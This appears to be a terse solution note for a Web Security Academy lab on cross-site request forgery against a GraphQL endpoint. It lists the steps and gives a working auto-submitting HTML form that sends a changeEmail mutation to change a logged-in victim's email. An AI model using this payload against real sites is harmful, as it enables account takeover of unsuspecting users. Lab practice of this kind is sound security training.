/*

The endpoint accepts requests with a content-type of x-www-form-urlencoded 
and is therefore vulnerable to cross-site request forgery (CSRF) attacks.

craft some HTML that uses a CSRF attack to change the viewer's email address, 
then upload it to your exploit server. 

1) POST /graphql/v1 HTTP/2
// analyse inQL

mutation {
    changeEmail(input: ChangeEmailInput) {
        email
    }
}


mutation {
    login(input: LoginInput) {
        success
        token
    }
}

2) dry run of the changeemail mutation request
// send to repeater 

mutation changeEmail($input: ChangeEmailInput!) {
    changeEmail(input: $input) {
        email
    }
}

{
    "input": {
        "email": "hello@gmail.com"
    }
}


3) add
Content-Type: application/x-www-form-urlencoded


4) 
query=mutation changeEmail{changeEmail(input:{email:"hacked@123.com"}){email}} 

<html>
    <form action="https://0ad400ad0492f899828a7e270091008a.web-security-academy.net/graphql/v1" method="POST">
        <!-- Create a form with method="POST" to send a POST request -->

        <input required type="email" name="query" value='mutation changeEmail{changeEmail(input:{email:"hackedd@12121.com"}){email}}'>
        <!-- Create an input field of type "email" and name it "query" -->

    </form>
    <script>
        document.forms[0].submit();
    </script>
</html>


HTML form with a single input field
submit a POST request to the specified GraphQL endpoint
The input field contains a GraphQL mutation query.


*/